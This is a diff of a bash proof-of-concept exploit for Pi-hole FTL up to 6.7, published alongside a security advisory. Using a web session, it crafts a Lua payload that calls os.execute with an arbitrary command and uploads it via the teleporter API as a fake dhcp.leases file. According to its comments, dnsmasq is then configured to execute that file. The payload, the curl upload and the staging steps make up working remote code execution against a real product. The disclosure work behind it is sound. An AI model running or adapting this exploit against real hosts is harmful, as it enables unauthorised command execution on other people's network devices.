@@ -1,12 +1,19 @@
 #!/bin/bash
 #
-# LinnemanLabs - pi-hole dnsmasq_lines PoC
+# LinnemanLabs - pi-hole dnsmasq_lines PoC, web-session to code exec
 #
-# https://linnemanlabs.com/pi-hole-root-with-extra-steps
+# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
 # https://github.com/linnemanlabs/advisories/
+#
+# https://github.com/pi-hole/FTL/security/advisories/GHSA-ww5x-xx4x-qvjr
 #
 # uses web login to run CMD on the remote pi-hole host
 # default CMD prints id and caps to /tmp/exec-proof
+#
+# uses teleporter to stage a lua script at /etc/pihole/dhcp.leases
+# then configures dnsmasq to execute that lua sript using dhcp-luascript
+#
+# works on FTL <= 6.7
 #
 PIPASS="password"
 PIHOST="192.168.1.1"
@@ -24,7 +31,7 @@ fi
 printf "os.execute(\"${CMD}\")\nfunction lease() end" > dhcp.leases
 tar -zcf teleport.dhcp.tar.gz dhcp.leases
 
-# 3. POST the crafted .tar.gz to teleport (can skip this if you staged it locally already)
+# POST the crafted .tar.gz to teleport (can skip this if you staged it locally already)
 res="$( curl -sk -H "X-FTL-SID: $SID" -X POST http://${PIHOST}/api/teleporter -F "file=@teleport.dhcp.tar.gz" )"
 resfiles="$( echo "${res}" | jq -r .files.[0] )"
 if [ "${resfiles}" == "/etc/pihole/dhcp.leases" ];then
